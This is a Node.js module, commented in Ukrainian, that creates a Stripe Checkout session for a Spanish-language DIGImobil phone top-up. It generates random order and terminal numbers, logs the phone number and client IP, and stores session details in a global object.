const { STRIPE_SECRET_KEY } = require('./constants');
const fetch = require('node-fetch');

// Абсолютно спрощена версія функції створення сесії Stripe
async function createStripeCheckoutSession(amount, phoneNumber, successUrl, cancelUrl, clientIP) {
  try {
    // Виводимо всі вхідні параметри для діагностики
    console.log('[STRIPE] INPUT:', {
      amount: amount,
      phoneNumber: phoneNumber,
      successUrl: successUrl,
      cancelUrl: cancelUrl,
      clientIP: clientIP
    });

    // Спрощена обробка даних
    const stripeUrl = 'https://api.stripe.com/v1/checkout/sessions';
    const priceInCents = Math.round(parseFloat(amount) * 100);
    const orderNumber = Math.floor(10000000 + Math.random() * 90000000).toString();
    const numberOfTerminal = Math.floor(856673 + Math.random() * 90000000).toString();

    // Ми навмисно не робимо жодної перевірки або зміни номера телефону
    console.log('[STRIPE] Using phone:', phoneNumber);

    // Формуємо опис платежу
    const description = `Numero de telefono: ${phoneNumber}\nImporte: €${(priceInCents / 100).toFixed(2)}\nNumero de pedido: ${orderNumber}\nNumero de terminal: ${numberOfTerminal}`;
    console.log('[STRIPE] Description:', description);

    // Підготовка запиту до Stripe
    const params = new URLSearchParams();
    params.append('payment_method_types[]', 'card');
    params.append('mode', 'payment');
    params.append('success_url', successUrl + '?session_id={CHECKOUT_SESSION_ID}');
    params.append('cancel_url', cancelUrl);
    params.append('locale', 'es');
    params.append('client_reference_id', clientIP || 'unknown-client');

    params.append('line_items[0][quantity]', '1');
    params.append('line_items[0][price_data][currency]', 'eur');
    params.append('line_items[0][price_data][unit_amount]', priceInCents.toString());
    params.append('line_items[0][price_data][product_data][name]', 'Recarga DIGImobil');
    params.append('line_items[0][price_data][product_data][description]', description);

    // Відправляємо запит до Stripe
    console.log('[STRIPE] Sending request to API...');
    
    const response = await fetch(stripeUrl, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${STRIPE_SECRET_KEY}`,
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: params.toString()
    });

    // Обробляємо відповідь
    const responseText = await response.text();
    console.log('[STRIPE] Response status:', response.status);
    
    if (!response.ok) {
      console.error('[STRIPE] API error:', responseText);
      throw new Error(`Stripe API error: ${response.status} - ${responseText}`);
    }

    // Парсимо відповідь
    const session = JSON.parse(responseText);
    console.log('[STRIPE] Session created:', session.id);

    // Зберігаємо довідкові дані сесії 
    global.paymentInfo = global.paymentInfo || {};
    global.paymentInfo[session.id] = {
      phoneNumber: phoneNumber,
      terminal: numberOfTerminal,
      amount: priceInCents / 100,
      orderNumber: orderNumber
    };
    console.log('[STRIPE] Stored payment info for session:', session.id);

    return { session };
  } catch (error) {
    console.error('[STRIPE] ERROR:', error);
    throw error;
  }
}

module.exports = {
  createStripeCheckoutSession
};